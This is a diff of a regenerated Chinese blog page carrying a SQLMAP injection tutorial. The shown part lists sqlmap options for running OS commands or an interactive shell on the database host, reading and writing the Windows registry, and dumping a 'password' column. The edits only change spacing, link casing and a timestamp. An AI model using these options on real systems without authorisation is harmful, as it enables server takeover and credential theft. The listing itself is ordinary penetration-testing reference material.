+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
 <ul>
 <li>–os-cmd=OSCMD 执行操作系统命令</li>
 <li>–os-shell 交互式的操作系统的 shell</li>
@@ -480,8 +481,8 @@ tablename -C "password" --dump
 <li>–msf-path=MSFPATH Metasploit Framework 本地的安装路径</li>
 <li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
 </ul>
-<p>  Windows 注册表访问：</p>
-<p>  这些选项可以被用来访问后端数据库管理系统 Windows 注册表。</p>
+<p>Windows 注册表访问：</p>
+<p>这些选项可以被用来访问后端数据库管理系统 Windows 注册表。</p>
 <ul>
 <li>–reg-read 读一个 Windows 注册表项值</li>
 <li>–reg-add 写一个 Windows 注册表项值数据</li>
@@ -500,7 +501,7 @@ tablename -C "password" --dump
 <li>–save file 保存选项到 INI 配置文件</li>
 <li>–batch 从不询问用户输入，使用所有默认配置。</li>
 </ul>
-<p>  Miscellaneous（杂项）：</p>
+<p>Miscellaneous（杂项）：</p>
 <ul>
 <li>
 <ul>
@@ -517,13 +518,13 @@ tablename -C "password" --dump
 </ul>
 </li>
 </ul>
-<p>  相关链接：<a href="http://bbs.ichunqiu.com/thread-10583-1-1.html?from=bkycold" target="_blank">http://bbs.ichunqiu.com/thread-10583-1-1.html</a></p>
+<p>相关链接：<a href="http://bbs.ichunqiu.com/thread-10583-1-1.html?from=bkycold" target="_blank">http://bbs.ichunqiu.com/thread-10583-1-1.html</a></p>
                     <div>
                         <hr>
 
 标题：SQLMAP注入教程<br>
-作者：<a href="https://ZZUGeneral.github.io" target="_blank">General</a><br>
-地址：<a href="https://ZZUGeneral.github.io/articles/2020/09/20/1600612025863.html" target="_blank">https://ZZUGeneral.github.io/articles/2020/09/20/1600612025863.html</a><br>
+作者：<a href="https://ZZUGEneral.github.io" target="_blank">General</a><br>
+地址：<a href="https://ZZUGEneral.github.io/articles/2020/09/20/1600612025863.html" target="_blank">https://ZZUGEneral.github.io/articles/2020/09/20/1600612025863.html</a><br>
 一个没有得到Java开发工作的测试员！
 <!-- 签名档内可使用 HTML、JavaScript -->
 <br>
@@ -603,7 +604,7 @@ tablename -C "password" --dump
     
 </div>
 <script type="text/javascript"
-        src="https://ZZUGeneral.github.io/skins/Bubble/js/TweenMax.min.js?1602754508835"
+        src="https://ZZUGEneral.github.io/skins/Bubble/js/TweenMax.min.js?1602754508835"
         charset="utf-8"></script>
 <footer class="footer">
     <div class="wrapper">
@@ -670,7 +671,7 @@ tablename -C "password" --dump
         </a>
  <br>
         &copy; 2020
-        <a href="https://ZZUGeneral.github.io">General 的个人博客</a>
+        <a href="https://ZZUGEneral.github.io">General 的个人博客</a>
         你一定会喜欢那个因为喜欢她而发光的自己！
         <span class="footer__heart">❤️</span><br>
         <div align="center">
@@ -685,8 +686,8 @@ tablename -C "password" --dump
 <script>
   var Label = {
     speech: true,
-    servePath: "https://ZZUGeneral.github.io",
-    staticServePath: "https://ZZUGeneral.github.io",
+    servePath: "https://ZZUGEneral.github.io",
+    staticServePath: "https://ZZUGEneral.github.io",
     luteAvailable: true,
     hljsStyle: 'github',
     langLabel: "zh_CN",
@@ -697,10 +698,10 @@ tablename -C "password" --dump
   }
 </script>
 <script type="text/javascript"
-        src="https://ZZUGeneral.github.io/skins/Bubble/js/common.min.js?1602754508835"
+        src="https://ZZUGEneral.github.io/skins/Bubble/js/common.min.js?1602754508835"
         charset="utf-8"></script>
 <script type="text/javascript"
-        src="https://ZZUGeneral.github.io/skins/Bubble/js/circleMagic.min.js?1602754508835"
+        src="https://ZZUGEneral.github.io/skins/Bubble/js/circleMagic.min.js?1602754508835"
         charset="utf-8"></script>
 
     <svg viewBox="0 0 32 32" width="100%" height="100%" class="side__top side__top--toc">
@@ -708,11 +709,11 @@ tablename -C "password" --dump
     </svg>
 
 <script type="text/javascript">
-    Util.addScript('https://ZZUGeneral.github.io/js/page.min.js?1602754508835', 'soloPageScript')
+    Util.addScript('https://ZZUGEneral.github.io/js/page.min.js?1602754508835', 'soloPageScript')
     var page = new Page({
         "commentContentCannotEmptyLabel": "评论不能为空",
         "oId": "1600612025863",
-        "blogHost": "https://ZZUGeneral.github.io",
+        "blogHost": "https://ZZUGEneral.github.io",
         "randomArticles1Label": "随机阅读：",
         "externalRelevantArticles1Label": "站外相关阅读："
     });
@@ -728,4 +729,4 @@ tablename -C "password" --dump
 </body>
 </html>
 
-<!-- Generated by Latke (https://github.com/88250/latke) in 46ms, 2020/10/21 08:28:34 -->
+<!-- Generated by Latke (https://github.com/88250/latke) in 34ms, 2020/11/10 14:53:26 -->
